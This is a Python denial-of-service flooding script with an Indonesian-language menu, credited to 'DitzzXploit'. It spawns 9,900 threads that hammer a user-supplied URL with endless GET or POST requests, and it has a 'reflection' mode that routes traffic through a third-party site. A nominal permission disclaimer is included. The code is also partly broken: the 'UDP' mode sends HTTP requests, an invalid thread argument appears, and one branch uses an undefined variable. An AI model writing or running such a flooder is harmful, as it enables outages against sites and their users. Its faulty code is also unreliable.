import requests
import threading
import time
from urllib.parse import urlparse

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def send_request(url):
    while True:
        try:
            response = requests.get(url, timeout=2)
            print(f"\033[1;32m[GET Request] \033[1;37mURL: {url} \033[1;32m| Thread: \033[1;37m{threading.current_thread().name} \033[1;32m| Status: \033[1;36m{response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"\033[1;31m[ERROR] GET Request failed: {e}")

def send_post_request(url):
    while True:
        try:
            response = requests.post(url, timeout=2)
            print(f"\033[1;32m[POST Request] URL: \033[1;37m{url} \033[1;32m| Thread: \033[1;37m{threading.current_thread().name} \033[1;32m| Status: \033[1;36m{response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"\033[1;31m[ERROR] POST Request failed: {e}")

def send_reflection_request(url, reflector_url):
    while True:
        try:
            response = requests.get(reflector_url, params={"url": url}, timeout=2)
            print(f"\033[1;32m[Reflection Request] Reflector: \033[1;37m{reflector_url} \033[1;32m| Target: \033[1;37m{url} \033[1;37m| Thread: {threading.current_thread().name} \033[1;32m| Status: \033[1;36m{response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"\033[1;31m[ERROR] Reflection Request failed: {e}")
            
def send_udp_request(url):
    while True:
        try:
            response = requests.get(url, timeout=2)
            print(f"\033[1;32m[UDP Request] \033[1;37mURL: {url} \033[1;32m| Thread: \033[1;37m{threading.current_thread().name} \033[1;32m| Status: \033[1;36m{response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"\033[1;31m[ERROR] UDP Request failed: {e}")
            
            
def launch_attack(url, attack_type, reflector_url=None):
    print(f"\033[1;32mMeluncurkan serangan \033[1;37m{attack_type} \033[1;32mke \033[1;37m{url}...")

    num_threads = 9900

    threads = []
    for _ in range(num_threads):
        if attack_type == "GET":
            thread = threading.Thread(target=send_request, args=(url,), daemon=True)
        elif attack_type == "POST":
            thread = threading.Thread(target=send_post_request, args=(url,), daemon=True, port=443)
        elif attack_type == "Reflection" and reflector_url:
            thread = threading.Thread(target=send_reflection_request, args=(url, reflector_url), daemon=True)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def show_menu():
    print("\n\033[1;37m=========[\033[1;31m MENU \033[1;37m]==========")
    print("Created By: DitzzXploit")
    print("\033[1;31m1. \033[1;37mGET Request")
    print("\033[1;31m2. \033[1;37mPOST Request")
    print("\033[1;31m3. \033[1;37mReflection Request")
    print("\033[1;31m4. \033[1;37mUdp Request ( Error/Proses)")
    print("\033[1;31m5. \033[1;37mKeluar")
    print("\n\033[1;37m===================")
    choice = input("Pilih opsi \033[1;31m(1-4):\033[1;36m ")
    return choice

def main():
    print("=== Program DDoS Testing (Pastikan Anda memiliki izin) ===")
    print("Gunakan script ini hanya untuk pengujian yang sah dan legal.\n")

    while True:
        choice = show_menu()

        if choice == "1":
            url = input("\033[1;37mMasukkan URL target \033[1;31m(http:// atau https://):\033[1;36m ")
            if is_valid_url(url):
                launch_attack(url, "GET")
            else:
                print("\033[1;31m[ERROR] URL tidak valid. Pastikan URL dimulai dengan http:// atau https://")
        elif choice == "2":
            url = input("\033[1;37mMasukkan URL target \033[1;31m(http:// atau https://):\033[1;36m ")
            if is_valid_url(url):
                launch_attack(url, "POST")
            else:
                print("\033[1;31m[ERROR] URL tidak valid. Pastikan URL dimulai dengan http:// atau https://")
        elif choice == "3":
            reflector_url = input("\033[1;37mMasukkan URL reflektor \033[1;31m(http:// atau https://):\033[1;36M ")
            if is_valid_url(url) and is_valid_url(reflector_url):
                launch_attack(url, "Reflection", reflector_url)
            else:
                print("\033[1;31m[ERROR] URL tidak valid. Pastikan URL dimulai dengan http:// atau https://")
                
        elif choice == "5":
            print("\033[1;37mProgram dihentikan. Terima kasih!")
            break
        else:
            print("\033[1;31m[ERROR] Pilihan tidak valid. Silakan coba lagi.")

if __name__ == "__main__":
    main()
